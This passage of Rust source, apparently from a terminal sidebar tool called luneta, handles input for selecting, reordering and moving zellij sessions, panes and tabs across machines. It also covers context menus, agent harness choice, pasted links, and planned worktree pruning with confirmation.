    /// Any other key ends it too, and does what it does without one, for
    /// which it is None.
    fn selected_key(&mut self, key: &KeyEvent) -> Option<Asked> {
        match key.code {
            KeyCode::Down => self.step(1),
            KeyCode::Up => self.step(-1),
            KeyCode::Esc => self.unselect(),
            KeyCode::Char(c) => match Top::of(c) {
                Some(Top::Move(by)) => self.step(by),
                Some(Top::Shift(by)) => self.shift(by),
                Some(Top::Command(Command::Reorder)) => self.unselect(),
                _ => {
                    self.unselect();
                    return None;
                },
            },
            _ => {
                self.unselect();
                return None;
            },
        }
        Some(Asked::Nothing)
    }

    /// Selects, for `J` and `K` to move, the session of the highlighted row,
    /// of whichever machine, with the sessions of that machine `j` and `k`
    /// grow the selection to, each with its panes; or on a machine's header,
    /// the machine, with the machines `j` and `k` grow it to, each with every
    /// row under its header.
    fn select(&mut self) {
        let Some(spot) = self.cursor.clone() else {
            return;
        };
        let Some(movable) = Movable::of(spot.session().unwrap_or(spot)) else {
            return;
        };
        self.cursor = Some(movable.spot());
        self.moving = Moving::Selected(movable);
    }

    /// Ends the selection, the highlight on a row it stops on without one,
    /// and puts back what `V` picked.
    fn unselect(&mut self) {
        if let Moving::Selected(_) | Moving::Carrying(..) | Moving::Asking(..) = self.moving {
            self.moving = Moving::Still;
            self.settle(None, false);
        }
    }

    /// What a key does while `V` carries a pane, or its tab: `J` and `K`, `j`
    /// and `k` and the arrows, move where it lands, among the rows of the
    /// other sessions of its machine, the lit rows showing it there; `V` takes
    /// up its tab, or puts back a tab; `Enter` sets it down there; and `Esc`
    /// puts it back, doing nothing else. Any other key puts it back too, and
    /// does what it does without it, for which it is None.
    fn carrying_key(&mut self, key: &KeyEvent) -> Option<Asked> {
        match key.code {
            KeyCode::Down => self.step_landing(1),
            KeyCode::Up => self.step_landing(-1),
            KeyCode::Esc => self.unselect(),
            KeyCode::Enter => return Some(self.set_down()),
            KeyCode::Char(c) => match Top::of(c) {
                Some(Top::Move(by) | Top::Shift(by)) => self.step_landing(by),
                Some(Top::Command(Command::Carry)) => self.widen(),
                _ => {
                    self.unselect();
                    return None;
                },
            },
            _ => {
                self.unselect();
                return None;
            },
        }
        Some(Asked::Nothing)
    }

    /// What a key does while a move asks whether it may end its session:
    /// `y` moves it, and any other key puts it back, doing nothing else.
    fn asking_key(&mut self, key: &KeyEvent) -> Asked {
        let Moving::Asking(carrying, landing) = std::mem::take(&mut self.moving) else {
            return Asked::Nothing;
        };
        if key.code == KeyCode::Char('y') && key.modifiers.is_empty() {
            return self.carried_off(carrying, landing, true);
        }
        self.settle(None, false);
        Asked::Nothing
    }

    /// Picks the pane of the highlighted row, of whichever machine, for `J`
    /// and `K` to take to another session of it; or says why it cannot go,
    /// as what runs in it would be cut short. A session's row, or a
    /// machine's header, picks nothing.
    fn carry(&mut self) {
        let Some(spot) = self.cursor.clone() else {
            return;
        };
        let Some(Place::Pane(place)) = spot.place().cloned() else {
            return;
        };
        let carrying = Carrying { machine: spot.machine(), place, whole: Whole::Pane };
        match self.carry_plan(&carrying) {
            Ok(_) => self.moving = Moving::Carrying(carrying, None),
            Err(why) => self.notify(format!("not moved: {why}")),
        }
    }

    /// `V` again: what `V` picked takes up the rest of its tab, where it
    /// shares one, or else goes back, as a tab does.
    fn widen(&mut self) {
        let Moving::Carrying(carrying, landing) = &self.moving else {
            return;
        };
        let tab = Carrying { whole: Whole::Tab, ..carrying.clone() };
        if carrying.whole == Whole::Tab || self.carried_rows(&tab).len() < 2 {
            self.unselect();
            return;
        }
        match self.carry_plan(&tab) {
            Ok(_) => self.moving = Moving::Carrying(tab, landing.clone()),
            Err(why) => self.notify(format!("not moved: {why}")),
        }
    }

    /// What moving `carrying` takes along, as its machine's daemon last
    /// said, or why it moves nothing: what runs in one of them would be cut
    /// short, as `carries::planned` says.
    fn carry_plan(&self, carrying: &Carrying) -> Result<Planned, String> {
        let seen = self.seen(&carrying.machine).ok_or("its machine's daemon says nothing")?;
        let seat = carrying.place.session.seat();
        carries::planned(seen.sessions, seen.agents, &seat, carrying.place.pane, carrying.whole)
    }

    /// The rows of what `carrying` takes: its pane's, or those of its tab's
    /// panes, next to each other, as a session's panes go by their tab.
    fn carried_rows(&self, carrying: &Carrying) -> Range<usize> {
        let Some(at) = self.row_of(&carrying.spot()) else {
            return 0..0;
        };
        if carrying.whole == Whole::Pane {
            return at..at + 1;
        }
        let tab_of = |row: &Row| match row {
            Row::Pane { machine, session, pane, .. } if *machine == carrying.machine => {
                let pane = self.pane_of(machine, session, *pane)?;
                Some((session.clone(), pane.tab))
            },
            _ => None,
        };
        let Some(tab) = tab_of(&self.rows[at]) else {
            return at..at + 1;
        };
        let same = |index: &usize| tab_of(&self.rows[*index]).as_ref() == Some(&tab);
        let start = (0..at).rev().take_while(same).last().unwrap_or(at);
        let end = (at + 1..self.rows.len()).take_while(same).last().map_or(at + 1, |end| end + 1);
        start..end
    }

    /// Where `carrying` can land, each by its row, in their order: the rows
    /// of the other sessions of its machine, each session's own and those of
    /// its panes it lists.
    fn landings(&self, carrying: &Carrying) -> Vec<(usize, Landing)> {
        let landings = self.rows.iter().enumerate();
        landings.filter_map(|(at, _)| Some((at, self.landing_at(carrying, at)?))).collect()
    }

    /// Where `carrying` lands by the row `at`: in a tab of its own on another
    /// session's row of its machine, or beside a pane on another session's
    /// pane's; and nowhere on any other row.
    fn landing_at(&self, carrying: &Carrying, at: usize) -> Option<Landing> {
        let own = &carrying.place.session;
        match &self.rows[at] {
            Row::Session { machine, session, .. }
                if *machine == carrying.machine && session != own =>
            {
                Some(Landing::Tab(session.clone()))
            },
            Row::Pane { machine, session, pane, .. }
                if *machine == carrying.machine && session != own =>
            {
                Some(Landing::Beside(PanePlace { session: session.clone(), pane: *pane }))
            },
            _ => None,
        }
    }

    /// Moves where what `V` carries lands `by` places, down or up, among
    /// where it can, and no further than the first or the last: from where it
    /// is, the first below it, or above.
    fn step_landing(&mut self, by: isize) {
        let Moving::Carrying(carrying, landing) = &self.moving else {
            return;
        };
        let landings = self.landings(carrying);
        let Some(from) = self.row_of(&carrying.spot()) else {
            return;
        };
        let on = landing.as_ref().and_then(|landing| {
            landings.iter().position(|(_, it)| it == landing)
        });
        let to = match on {
            Some(at) => Some(at.saturating_add_signed(by).min(landings.len().saturating_sub(1))),
            None if by > 0 => landings.iter().position(|(row, _)| *row > from),
            None => landings.iter().rposition(|(row, _)| *row < from),
        };
        if let Some((_, landing)) = to.and_then(|to| landings.get(to)) {
            self.moving = Moving::Carrying(carrying.clone(), Some(landing.clone()));
        }
    }

    /// `Enter` while `V` carries: sets it down where it lands, as `land_on`
    /// does; with nowhere to land yet, puts it back.
    fn set_down(&mut self) -> Asked {
        match std::mem::take(&mut self.moving) {
            Moving::Carrying(carrying, Some(landing)) => self.land_on(carrying, landing),
            kept => {
                self.moving = kept;
                self.unselect();
                Asked::Nothing
            },
        }
    }

    /// Sets `carrying` down on `landing`: has luneta move it, once more
    /// nothing would be cut short, as the daemon last said; or first asks
    /// whether it may end its session, where it is all the session has.
    fn land_on(&mut self, carrying: Carrying, landing: Landing) -> Asked {
        self.cursor = Some(carrying.spot());
        let planned = match self.carry_plan(&carrying) {
            Ok(planned) => planned,
            Err(why) => {
                self.notify(format!("not moved: {why}"));
                self.settle(None, false);
                return Asked::Nothing;
            },
        };
        let own = &carrying.place.session;
        let panes = self.seen(&carrying.machine).and_then(|seen| {
            let mut sessions = seen.sessions.iter();
            let session = sessions.find(|session| Listed::of(session).as_ref() == Some(own))?;
            Some(session.panes.as_ref().map_or(0, |panes| panes.panes.len()))
        });
        if panes.is_some_and(|panes| panes <= planned.goes.len()) {
            self.moving = Moving::Asking(carrying, landing);
            return Asked::Nothing;
        }
        self.carried_off(carrying, landing, false)
    }

    /// Has luneta move `carrying` to `landing`, where it may end its session
    /// as `ending` says, and take zellij's client with it where it is on one
    /// of its panes: there first, where the session it leaves ends, or the
    /// one it goes to has no client to make room for a tab.
    fn carried_off(&mut self, carrying: Carrying, landing: Landing, ending: bool) -> Asked {
        self.moving = Moving::Still;
        self.settle(None, false);
        let Carrying { machine, place, whole } = carrying;
        let carrying = Carrying { machine: machine.clone(), place: place.clone(), whole };
        let panes: Vec<u32> = self.carry_plan(&carrying).map_or_else(
            |_| vec![place.pane],
            |planned| planned.goes.iter().map(|(pane, _)| *pane).collect(),
        );
        let here = self.here_place().ok().filter(|_| machine == self.on);
        let on_one = here
            .filter(|here| here.session == place.session && panes.contains(&here.pane))
            .map(|here| here.pane);
        let to = landing.session();
        let clientless = || {
            let sessions = self.seen(&machine).map_or(&[][..], |seen| seen.sessions);
            let session = sessions.iter().find(|session| Listed::of(session).as_ref() == Some(to));
            session.is_none_or(|session| {
                session.clients.as_ref().is_none_or(|clients| clients.clients.is_empty())
            })
        };
        let leaves = ending || (matches!(landing, Landing::Tab(_)) && clientless());
        let follows = match on_one {
            None => Follows::Stays,
            Some(pane) if leaves => Follows::First(pane),
            Some(pane) => Follows::After(pane),
        };
        let (from, lands) = (place.session.seat(), landing.lands());
        match Carry::new(from, place.pane, whole, to.seat(), lands, ending) {
            Ok(carry) => Asked::Carry { on: machine, carry, landing, follows },
            Err(why) => {
                self.notify(format!("not moved: {why}"));
                Asked::Nothing
            },
        }
    }

    /// What came of moving panes of `on` to `to`, as luneta asked, with
    /// zellij's client on the pane `follows`, if on one of them: each that
    /// opened by the terminal it opened as there. The client goes to its
    /// pane's, and the highlight to the first that opened, once it shows.
    /// What did not open, or why nothing closed, the notes say.
    pub fn carried(
        &mut self,
        on: Machine,
        to: &Listed,
        follows: Option<u32>,
        carried: Result<Moved, String>,
    ) -> Asked {
        let carried = match carried {
            Ok(Moved::All(carried)) => carried,
            Ok(Moved::Stranded { opened, why }) => {
                self.notify(format!("move: {why}"));
                opened
            },
            Err(why) => {
                self.notify(format!("move: {why}"));
                return Asked::Nothing;
            },
        };
        let opened = |pane: u32| Place::Pane(PanePlace { session: to.clone(), pane });
        if let Some((_, first)) = carried.first() {
            self.arriving = Some(Spot::on(&on, opened(*first)));
        }
        let followed = follows.and_then(|pane| carried.iter().find(|(from, _)| *from == pane));
        match followed {
            Some((_, terminal)) => Asked::Go { on, place: opened(*terminal) },
            None => Asked::Nothing,
        }
    }

    /// Moves what the selection holds `by` places down, or up, and no
    /// further than the ends, among the rows as the order is kept now: a
    /// move another luneta made stays, though this one has yet to hear of
    /// it, or never will, as one whose watcher failed. A session goes no
    /// further than the first of its machine's, or the last. They stay
    /// selected, for the next move.
    fn shift(&mut self, by: isize) {
        self.reorder();
        let Some((spans, held)) = self.selected() else {
            return;
        };
        let to = held.start.saturating_add_signed(by).min(spans.len() - held.len());
        if to != held.start {
            self.keep(spans.moved(held, to));
        }
    }

    /// What the selection moves among, and which of them it holds, while it
    /// lasts.
    fn selected(&self) -> Option<(Spans, Range<usize>)> {
        let Moving::Selected(anchor) = &self.moving else {
            return None;
        };
        let spans = self.spans(anchor);
        let rows = spans.rows();
        let index = |at: usize| rows.iter().position(|span| span.contains(&at));
        let (from, to) = (index(self.row_of(&anchor.spot())?)?, index(self.cursor_index()?)?);
        Some((spans, from.min(to)..from.max(to) + 1))
    }

    /// What `movable` moves among: the machines, or the sessions of its
    /// machine.
    fn spans(&self, movable: &Movable) -> Spans {
        match movable {
            Movable::Machine(_) => Spans::Machines(self.machines_spanned()),
            Movable::Session(machine, _) => {
                Spans::Sessions(machine.clone(), self.sessions(machine))
            },
        }
    }

    /// The machines, each with the rows it spans: its header, and every row
    /// under it, up to the next machine's.
    fn machines_spanned(&self) -> Vec<(Machine, Range<usize>)> {
        let headers = self.rows.iter().enumerate().filter_map(|(at, row)| match row {
            Row::Machine { machine, .. } => Some((at, machine)),
            Row::Session { .. } | Row::Pane { .. } => None,
        });
        let starts: Vec<(usize, &Machine)> = headers.collect();
        let ends = starts.iter().skip(1).map(|(at, _)| *at).chain([self.rows.len()]);
        let spanned = starts.iter().zip(ends);
        spanned.map(|((start, machine), end)| ((*machine).clone(), *start..end)).collect()
    }

    /// The sessions of `machine`, each by its name, with the rows it spans:
    /// its own and its panes', up to the next session's, or the next
    /// machine's header. Sessions of one name next to each other go as one,
    /// as the order goes by name, and cannot move one without the other.
    fn sessions(&self, machine: &Machine) -> Vec<(String, Range<usize>)> {
        let spanned = self.machines_spanned().into_iter().find(|(it, _)| it == machine);
        let Some((_, span)) = spanned else {
            return Vec::new();
        };
        let mut starts: Vec<(usize, &str)> = Vec::new();
        for (at, row) in self.rows.iter().enumerate().take(span.end).skip(span.start + 1) {
            if let Row::Session { session, .. } = row
                && starts.last().map(|(_, name)| *name) != Some(session.name.as_str())
            {
                starts.push((at, session.name.as_str()));
            }
        }
        let ends = starts.iter().skip(1).map(|(at, _)| *at).chain([span.end]);
        let spanned = starts.iter().zip(ends);
        spanned.map(|((start, name), end)| ((*name).to_owned(), *start..end)).collect()
    }

    /// Keeps `spans`, the machines or the sessions of one, in their order
    /// now, for every luneta, and builds the rows again in it.
    fn keep(&mut self, spans: Spans) {
        match spans {
            Spans::Machines(machines) => {
                let machines: Vec<Machine> = machines.into_iter().map(|(it, _)| it).collect();
                self.order.keep_machines(&machines);
            },
            Spans::Sessions(machine, sessions) => {
                let names = sessions.into_iter().map(|(name, _)| name).collect();
                self.order.keep_sessions(&machine, names);
            },
        }
        self.rebuild();
    }

    /// The rows, by their index, in the order they show while `spans`, as
    /// `landing` has them, go in theirs: those before them, they so, and
    /// those after.
    fn landed(&self, spans: &[Range<usize>]) -> Vec<usize> {
        let start = spans.iter().map(|span| span.start).min().unwrap_or(0);
        let end = spans.iter().map(|span| span.end).max().unwrap_or(0);
        let moved = spans.iter().flat_map(Clone::clone);
        (0..start).chain(moved).chain(end..self.rows.len()).collect()
    }

    /// Where `lift` lands as things stand: what it moves among, in the order
    /// they take once the mouse lets go, and the rows the lifted one spans,
    /// with a session those of its name next to it, which go with it. It
    /// lands where its row is nearest to the line the mouse holds it on, a
    /// session among those of its machine alone, and goes back while the
    /// mouse is off the sidebar.
    fn landing(&self, movable: &Movable, line: u16, over: bool) -> Option<(Spans, Range<usize>)> {
        let at = self.row_of(&movable.spot())?;
        let spans = self.spans(movable);
        let rows = spans.rows();
        let from = rows.iter().position(|span| span.contains(&at))?;
        let lifted = rows[from].clone();
        if !over {
            return Some((spans, lifted));
        }
        let lines = |span: Range<usize>| self.rows[span].iter().map(Row::height).sum::<usize>();
        // The line the lifted rows start on: the mouse holds the row it
        // lifted, under any session of its name it goes with.
        let above = HEADER + lines(lifted.start..at);
        let top = (self.top + usize::from(line)) as isize - above as isize;
        // The line each place among the others starts on, with the lifted
        // rows out of them, and the line after the last: from where the
        // first of them starts, under the header of their machine for
        // sessions.
        let mut line = lines(0..rows[0].start);
        let mut gaps = Vec::with_capacity(rows.len());
        for (index, span) in rows.iter().enumerate() {
            if index != from {
                gaps.push(line);
                line += lines(span.clone());
            }
        }
        gaps.push(line);
        let distance = |gap: &usize| ((gaps[*gap] as isize - top).unsigned_abs(), *gap != from);
        let to = (0..gaps.len()).min_by_key(distance).unwrap_or(from);
        Some((spans.moved(from..from + 1, to), lifted))
    }

    /// Where what the mouse carries lands, with the pointer on the line `line`
    /// of the sidebar, `over` it or not: by the row under the pointer as the
    /// rows lie where nothing is carried, which shows with what it carries
    /// under it, and so goes on landing there while the pointer stays.
    /// Nowhere while the pointer is off the sidebar, or on a row of its own
    /// session, or of another machine.
    fn carry_landing(&self, carrying: &Carrying, line: u16, over: bool) -> Option<Landing> {
        if !over {
            return None;
        }
        let line = (self.top + usize::from(line)).checked_sub(HEADER)?;
        self.landing_at(carrying, self.row_at(line)?)
    }

    /// The row what lands on `landing` shows after: the pane's it goes
    /// beside, or the last of the session it opens a tab of, as a tab opens
    /// after the others.
    fn shows_after(&self, machine: &Machine, landing: &Landing) -> Option<usize> {
        let at = self.row_of(&Spot::on(machine, landing.place()))?;
        let Landing::Tab(session) = landing else {
            return Some(at);
        };
        let of_session = |row: &Row| matches!(row, Row::Pane { session: of, .. } if of == session);
        let panes = self.rows[at + 1..].iter().take_while(|row| of_session(row)).count();
        Some(at + panes)
    }

    /// What the left button lifts by the row `at`, pressed on its column
    /// `column`: a machine by its header, a session by its row, and a pane by
    /// its row, or its tab by the bracket that joins it to the others.
    fn lifting(&self, at: usize, column: u16) -> Option<Lifting> {
        let Row::Pane { machine, session, pane, bracket, .. } = &self.rows[at] else {
            return Movable::of(self.rows[at].spot()).map(Lifting::Moved);
        };
        let on_bracket = bracket.is_some() && column <= BRACKET_COLUMN;
        let whole = if on_bracket { Whole::Tab } else { Whole::Pane };
        let place = PanePlace { session: session.clone(), pane: *pane };
        Some(Lifting::Carried(Carrying { machine: machine.clone(), place, whole }))
    }

    /// Opens the menu for the highlighted row, on the group `key` opens, or on
    /// the first with no key. A key the menu has not opens nothing.
    fn open_menu(&mut self, key: Option<char>) -> Asked {
        let Some(target) = self.target() else {
            return Asked::Nothing;
        };
        self.menus += 1;
        let agent = self.agent_for(&target);
        let Some(did) = Menu::open(self.menus, target, key, agent) else {
            return Asked::Nothing;
        };
        self.menu_did(did)
    }

    /// The harness you picked last for the agents the menu starts.
    pub fn agent(&self) -> agents::Harness {
        self.agent.harness()
    }

    /// Keeps `harness` for the agents the menu starts, for every luneta, or
    /// says why it is this luneta's alone.
    fn keep_agent(&mut self, harness: agents::Harness) {
        if let Err(why) = self.agent.keep(harness) {
            let name = agents::name(harness);
            self.say(format!("agent: {name} is for this luneta alone: {why}"));
        }
    }

    /// The harness the menu for `target` starts agents in: that of the agent
    /// in its pane, where one runs, or else the one you picked last.
    fn agent_for(&self, target: &Target) -> agents::Harness {
        self.harness_in(target).unwrap_or_else(|| self.agent.harness())
    }

    /// The harness of the agent in the pane of `target`, where one runs that
    /// luneta knows the harness of.
    fn harness_in(&self, target: &Target) -> Option<agents::Harness> {
        let Target::Pane(machine, row) = target else {
            return None;
        };
        let seen = self.seen(machine)?;
        let shown = self.pane_of(machine, &row.session, row.pane)?;
        let seats = seated(seen.agents, seen.sessions);
        seats.get(&(row.session.name.as_str(), shown.id)).and_then(|agent| agents::of(agent))
    }

    /// What the menu is for, as it opens on the highlighted row.
    fn target(&self) -> Option<Target> {
        let spot = self.cursor.clone()?;
        self.row_of(&spot)?;
        match spot {
            Spot::Machine(machine) => Some(Target::Machine(machine)),
            Spot::Local(place) => Some(self.target_at(&Machine::Local, place)),
            Spot::Remote(destination, place) => {
                Some(self.target_at(&Machine::Remote(destination), place))
            },
        }
    }

    /// What the menu is for, as it opens on `place`, of `machine`: for a
    /// pane, the directory it works in, or its agent, as its row says it,
    /// the branch checked out there, its pull request, and what its shell
    /// said it ran last. A session has none of them, having no pane.
    fn target_at(&self, machine: &Machine, place: Place) -> Target {
        let (session, pane) = match place {
            Place::Session(session) => return Target::Session(machine.clone(), session),
            Place::Pane(PanePlace { session, pane }) => (session, pane),
        };
        let seen = self.seen(machine);
        let shown = self.pane_of(machine, &session, pane);
        let agents = seen.as_ref().map(|seen| seated(seen.agents, seen.sessions));
        let cwd = shown.and_then(|shown| {
            match agents.as_ref()?.get(&(session.name.as_str(), shown.id)) {
                Some(agent) => Some(agent_dir(agent, shown).to_owned()),
                None => shown.cwd.clone(),
            }
        });
        let trees = seen.iter().flat_map(|seen| seen.work_trees);
        let tree = cwd.as_deref().and_then(|cwd| trees.into_iter().find(|tree| tree.dir == cwd));
        let tree = tree.and_then(WorkTree::of_api);
        let checkout = tree.as_ref().and_then(|tree| checkout(tree, None));
        let branch = checkout.map(|checkout| checkout.branch);
        let repository = tree.as_ref().and_then(repository_of);
        let pulls = seen.iter().flat_map(|seen| seen.pull_requests);
        let pull_request =
            cwd.as_deref().and_then(|cwd| pulls.into_iter().find(|pull| pull.dir == cwd));
        let pull_request = pull_request.and_then(PullRequest::of_api);
        let ran = self.ran_in(machine, &session, pane);
        let row = PaneRow { session, pane, cwd, branch, repository, pull_request, ran };
        Target::Pane(machine.clone(), row)
    }

    /// What the shell in the pane `pane` of `session`, of `machine`, said it
    /// ran last, as the daemon passed it on.
    fn ran_in(&self, machine: &Machine, session: &Listed, pane: u32) -> Ran {
        let shell = self.pane_of(machine, session, pane).and_then(|shown| shown.shell.as_ref());
        shell.map_or(Ran::Unhooked, ran)
    }

    /// The open menu's row is a pane's whose shell may have ended a
    /// command, or begun one, since the menu opened, as the daemon says now:
    /// the menu has what it ran from it.
    fn reran(&mut self) {
        let Some(Target::Pane(machine, row)) = self.menu.as_ref().map(Menu::target) else {
            return;
        };
        let ran = self.ran_in(machine, &row.session, row.pane);
        if let Some(menu) = &mut self.menu {
            menu.reran(ran);
        }
    }

    /// Opens the menu for the pane luneta's zellij is on, on its first group,
    /// in the place of one open at the bottom, to float over zellij once the
    /// keys are its own. None opens while the sidebar does not know which
    /// pane that is: why, for luneta to say over zellij, and in the log.
    /// What went wrong before goes from the notes, as it does for any key the
    /// sidebar takes.
    pub fn float_menu(&mut self) -> Result<(), &'static str> {
        self.notice = None;
        let place = Place::Pane(self.here_place().inspect_err(|why| log::say(why))?);
        self.menus += 1;
        let target = self.target_at(&self.on, place);
        let agent = self.agent_for(&target);
        self.menu = Some(Menu::new(self.menus, target, agent));
        Ok(())
    }

    /// Opens the menu for the pull request or the issue `text` is the link
    /// of, or the `.md` file it is the path of, if it is one, in the place of
    /// the menu open, over zellij or at the bottom of the sidebar, or else at
    /// the bottom, for the row highlighted: its keys act on the machine of
    /// that row, as every key of the menu does, or on another that has a
    /// link's repository, where that one has none of it. A file is looked for
    /// once a key is pressed, as only the row's machine can say, and a relative
    /// path goes from where the row works. Other text does nothing, as a
    /// paste did before. What is pasted in the box for a machine's
    /// destination goes in it, a link too.
    pub fn paste(&mut self, text: &str) {
        if self.menu.as_mut().is_some_and(|menu| menu.paste(text)) {
            return;
        }
        let target = match &self.menu {
            Some(menu) => Some(menu.target().clone()),
            None => self.target(),
        };
        // A directory by no absolute path, as an agent's session file may say,
        // is none to go from: a relative path says so, once a key is pressed.
        let from = target.as_ref().and_then(Target::cwd);
        let from = from.and_then(|from| Directory::parse(from.to_owned()).ok());
        let Some(work) = Work::parse(text, from) else {
            return;
        };
        self.notice = None;
        let Some(target) = target else {
            if self.cursor.is_none() {
                self.say(format!("menu: no row is highlighted for {work} to open the menu on"));
            }
            return;
        };
        self.menus += 1;
        self.menu = Some(Menu::pull(self.menus, target, work, self.agent.harness()));
    }

    /// The menu, while it floats over zellij.
    pub fn floating(&self) -> Option<&Menu> {
        self.menu.as_ref().filter(|_| self.floats())
    }

    /// What a click on `choice` of the menu numbered `menu` does: what its
    /// key does, or `Enter` with the cursor on its skill. Nothing where that
    /// menu closed since it drew, as what zellij answers it goes nowhere then.
    pub fn chose(&mut self, menu: u64, choice: Choice, now: SystemTime) -> Asked {
        if self.menu.as_ref().is_none_or(|open| open.number() != menu) {
            return Asked::Nothing;
        }
        match choice {
            Choice::Key(key) => self.key(&key, now),
            Choice::Skill(name) => self.pick(&name),
        }
    }

    /// What a click on the key `key` of the keys `keyed` at the bottom does:
    /// what the key does, while those keys show there still, and the sidebar
    /// has the keys. Nothing once something took their place since they
    /// drew, or the keys went elsewhere: the search stays open under a box
    /// over zellij, but its keys are the box's, and the menu floating there
    /// would take an `Enter` meant for the search.
    pub fn keys_clicked(&mut self, keyed: Keyed, key: &KeyEvent, now: SystemTime) -> Asked {
        let there = match self.bottom() {
            Bottom::Legend | Bottom::Yank => Some(Keyed::Legend),
            Bottom::Search(_) => Some(Keyed::Search),
            Bottom::Menu(_) | Bottom::Nothing => None,
        };
        if self.keys != Keys::Sidebar || there != Some(keyed) {
            return Asked::Nothing;
        }
        self.key(key, now)
    }

    /// What `Enter` does with the cursor of the menu's search box on the
    /// skill called `name`, as a key would, which drops a `g` pressed before
    /// it and what went wrong before.
    fn pick(&mut self, name: &Name) -> Asked {
        self.notice = None;
        self.pending = Pending::Nothing;
        let Some(menu) = self.menu.take() else {
            return Asked::Nothing;
        };
        self.menu_did(menu.pick(name))
    }

    /// Moves the cursor of the search box of the menu numbered `menu` `by`
    /// skills, as the wheel does over them, while that menu is open.
    pub fn scroll_menu(&mut self, menu: u64, by: isize) {
        if let Some(open) = self.menu.as_mut().filter(|open| open.number() == menu) {
            open.scroll(by);
        }
    }

    /// Whether the menu floats over zellij, rather than standing at the
    /// bottom of the sidebar: it does while the keys are its own there.
    fn floats(&self) -> bool {
        matches!(self.keys, Keys::Menu { .. })
    }

    /// What the daemon last said of `machine`, where it said anything of it.
    fn seen(&self, machine: &Machine) -> Option<Seen<'_>> {
        let machines = machines(self.host.as_ref()?);
        match machine {
            Machine::Local => Some(machines.here),
            Machine::Remote(destination) => {
                machines.others.into_iter().find(|(other, _)| other == destination)?.1.ok()
            },
        }
    }

    /// The pane `id` of the session `listed`, of `machine`, as the daemon
    /// last said.
    fn pane_of(&self, machine: &Machine, listed: &Listed, id: u32) -> Option<&Pane> {
        let sessions = self.seen(machine)?.sessions;
        let session = sessions.iter().find(|it| Listed::of(it).as_ref() == Some(listed))?;
        session.panes.iter().flat_map(|panes| &panes.panes).find(|pane| pane.id == id)
    }

    /// Keeps the menu a key left open, if any, does what the key left the
    /// sidebar to do, and asks luneta for what that takes.
    fn menu_did(&mut self, did: Did) -> Asked {
        let (menu, wants) = match did {
            Did::Stays(menu, wants) => (menu, wants),
            Did::Closed(done) => {
                self.menu = None;
                return match done {
                    Done::Nothing => Asked::Nothing,
                    Done::Wrong(reason) => {
                        self.say(reason);
                        Asked::Nothing
                    },
                    Done::Start(on, starts) => match self.out_of_reach(&on) {
                        Some(why) => {
                            self.say(why);
                            Asked::Nothing
                        },
                        None => Asked::Start { on, starts },
                    },
                    Done::Go(on, place) => Asked::Go { on, place },
                    Done::Act(on, act) => self.delete(on, act),
                    Done::Brief(briefed) => self.brief(briefed),
                    Done::Ask(target) => Asked::Ask(target),
                    Done::Ssh(destination) => Asked::Ssh(destination),
                    Done::Forget(destination) => Asked::Forget(destination),
                };
            },
        };
        let (number, on) = (menu.number(), menu.target().machine().clone());
        self.menu = Some(menu);
        match wants {
            Wants::Nothing => Asked::Nothing,
            Wants::Keep(harness) => {
                self.keep_agent(harness);
                Asked::Nothing
            },
            Wants::Skills { cwd, agent } => Asked::Find { menu: number, on, cwd, agent },
            Wants::Refind { cwd, agent } => {
                self.keep_agent(agent);
                Asked::Find { menu: number, on, cwd, agent }
            },
            Wants::Open { session, cwd, opens: Opens::Pane { beside, command }, .. } => {
                let open = Open::Pane { session: session.name, beside, cwd, command };
                Asked::Open { menu: number, on, open }
            },
            // A tab needs a client of its session to make room for it. The
            // session luneta's zellij is in has one, and another opens it once
            // luneta's zellij is there, on that session's machine: its last
            // client may have left since lunetad listed them.
            Wants::Open { session, pane, cwd, opens: Opens::Tab { name, command } } => {
                let place = Place::Pane(PanePlace { session, pane });
                let session = place.listed().name().clone();
                let tab = Tab { cwd, name, command };
                let open = Open::Tab { session: session.clone(), tab, alone_since: None };
                let here = self.going().is_none() && self.on == on;
                if here && self.here() == Some(session.as_str()) {
                    Asked::Open { menu: number, on, open }
                } else {
                    Asked::OpenThere { menu: number, on, place, open }
                }
            },
            Wants::Tabs { session, pane } => {
                Asked::Tabs { menu: number, on, session: session.name, pane }
            },
            Wants::Turn { session, pane, turn } => {
                Asked::Turn { menu: number, on, place: PanePlace { session, pane }, turn }
            },
            Wants::Pull(work, wanted) => match self.worked(&on) {
                Ok(worked) => {
                    let others = self.others(&on);
                    Asked::Pull { menu: number, on, work, wanted, worked, others }
                },
                Err(why) => self.pulled(number, Err(why)),
            },
            Wants::Printed { session, pane, ended } => {
                Asked::Printed { menu: number, on, session: session.name, pane, ended }
            },
            Wants::Checks { page } => Asked::Checks { menu: number, on, page },
            Wants::Make { session, cwd, tab_cwd, name, command } => {
                Asked::Make { menu: number, on, session, cwd, tab_cwd, name, command }
            },
            Wants::Prunes { dir } => Asked::Prunes { menu: number, on, dir },
            Wants::Prune { dir, agreed } => Asked::Prune { menu: number, on, dir, agreed },
            Wants::Plan { session, scope: Scope::Pane(pane) } => {
                Asked::Closes { menu: number, on, session: session.name, pane }
            },
            Wants::Plan { session, scope: Scope::Session } => {
                let plan = self.plan(&on, &session, Deletes::Session);
                self.planned(plan)
            },
        }
    }

    /// The menu planned what its delete key deletes so: what it asks of
    /// luneta.
    fn planned(&mut self, plan: Result<Plan, String>) -> Asked {
        let Some(menu) = self.menu.take() else {
            return Asked::Nothing;
        };
        self.menu_did(menu.planned(plan))
    }

    /// `d m` of the menu numbered `menu` heard what it would delete, as `plan`
    /// says, or why it did not: the menu goes on, while it waits on it.
    pub fn prunes(&mut self, menu: u64, plan: Result<prunes::Plan, String>) -> Asked {
        let Some(waiting) = self.menu.take_if(|it| it.number() == menu && it.sweeping()) else {
            return Asked::Nothing;
        };
        if let Ok(plan) = &plan {
            log_unasked(plan);
        }
        self.menu_did(waiting.swept(plan))
    }

    /// `d m` of the menu numbered `menu` heard what came of what it was told to
    /// delete, as `pruned` says, or why it did not hear. Where what would go has
    /// changed, nothing went, and it lists that again, while it waits on it. Else
    /// the menu closes, while it waits on it, and a note says what stays.
    pub fn pruned(&mut self, menu: u64, pruned: Result<prunes::Pruned, String>) -> Asked {
        let waiting = self.menu.take_if(|it| it.number() == menu && it.pruning());
        match pruned {
            Ok(prunes::Pruned::Changed(plan)) => {
                log_unasked(&plan);
                if let Some(waiting) = waiting {
                    return self.menu_did(waiting.changed(plan));
                }
                self.say("menu: nothing deleted: what would go changed".to_owned());
            },
            Ok(prunes::Pruned::Went(outcomes)) => {
                if let Some(note) = prune::note(&outcomes) {
                    self.say(note);
                }
            },
            Err(why) => self.say(format!("menu: it may have deleted some worktrees: {why}")),
        }
        Asked::Nothing
    }

